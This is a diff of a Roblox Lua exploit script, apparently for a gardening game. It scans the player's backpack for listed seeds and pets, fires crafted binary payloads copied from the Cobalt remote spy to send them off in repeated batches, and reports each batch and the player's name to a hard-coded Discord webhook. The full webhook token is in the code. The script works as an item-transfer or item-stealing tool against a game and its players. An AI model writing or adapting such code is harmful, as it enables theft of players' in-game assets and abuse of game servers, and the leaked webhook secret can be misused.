@@ -1,4 +1,4 @@
--- Dynamic payload sender – only selected items are allowed
+-- Dynamic Mass Sender (only selected items)
 local ALLOWED_PETS = {"Robin"}
 local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
@@ -13,7 +13,6 @@ for _, p in ipairs(ALLOWED_PETS) do petLookup[p:lower()] = true end
 local seedLookup = {}
 for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[s:lower()] = true end
 
--- Webhook notifier
 local function sendWebhook(msg)
     local req = (type(request) == "function" and request) 
         or (type(http_request) == "function" and http_request) 
@@ -29,7 +28,7 @@ local function sendWebhook(msg)
     end
 end
 
--- Builds one item block exactly as Cobalt does
+-- Builds one item block exactly as the working Cobalt calls
 local function buildItemBlock(itemKey, count, category)
     return table.concat({
         "\x1C",
@@ -42,8 +41,9 @@ local function buildItemBlock(itemKey, count, category)
     })
 end
 
--- Verified header from a working multi‑item call
-local HEADER = "!\x01\x1C\x00\x00\xC0\x04\xD6&\xF0A\x1C\x05\x01"
+-- Verified headers from Cobalt (single vs multi)
+local HEADER_SINGLE = "!\x01\x18\x00\x00\xC0\x04\xD6&\xF0A\x1C\x05\x01"
+local HEADER_MULTI  = "!\x01\x33\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
 
 sendWebhook("🚀 **Mass Sender Started** by " .. player.Name)
 
@@ -51,10 +51,9 @@ while true do
     local items = backpack:GetChildren()
     local queue = {}
 
-    -- Scan for matching seeds and pets (max 20 per batch)
+    -- Scan for allowed seeds and pets (max 20 per batch)
     for _, item in ipairs(items) do
         if #queue >= 20 then break end
-        
         local mainCat = item:GetAttribute("MainCategory")
         if mainCat == "Seed" then
             local seedName = item:GetAttribute("SeedTool")
@@ -86,8 +85,9 @@ while true do
         break
     end
 
-    -- Build payload with correct separators
-    local payload = HEADER
+    -- Choose correct header and build payload
+    local header = (#queue == 1) and HEADER_SINGLE or HEADER_MULTI
+    local payload = header
     for i, itemData in ipairs(queue) do
         if i > 1 then
             payload = payload .. "\x00\x05" .. string.char(i)
@@ -96,18 +96,18 @@ while true do
     end
     payload = payload .. "\x00\x00\x00"
 
-    -- Fire the remote – items are sent, server handles removal
+    -- Fire the remote (no client deletion)
     if Event then
         Event:FireServer(buffer.fromstring(payload))
     end
 
-    -- Log what was sent (no client destruction)
+    -- Log sent items
     local logLines = {}
     for _, itemData in ipairs(queue) do
         table.insert(logLines, string.format("• %s (x%d) sent.", itemData.instance.Name, itemData.count))
     end
     sendWebhook("⚡ **Batch fired (" .. #queue .. " items):**\n" .. table.concat(logLines, "\n"))
 
-    -- 12‑second cooldown before next batch
+    -- 12-second cooldown
     task.wait(12)
 end
